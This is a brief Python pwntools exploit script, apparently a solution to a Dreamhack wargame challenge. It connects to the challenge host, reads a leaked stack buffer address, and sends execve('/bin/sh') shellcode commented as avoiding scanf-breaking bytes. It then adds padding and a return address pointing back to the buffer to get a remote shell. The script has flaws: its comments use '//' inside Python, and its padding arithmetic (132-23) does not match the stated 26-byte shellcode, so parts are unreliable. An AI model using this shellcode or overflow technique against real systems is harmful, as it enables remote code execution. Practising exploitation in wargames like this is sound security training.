#! /usr/bin/python3

from pwn import *

p = remote("host3.dreamhack.games",12716)
buf = int(p.recvline()[7:17], 16) //7번 index ~ 16번 Index까지 가져와서 16진수로 저장
payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"  //scanf 우회 shellcode 26bytes
payload += b"A" * (132-23) 
payload += p32(buf)

p.sendline(payload)
p.interactive()
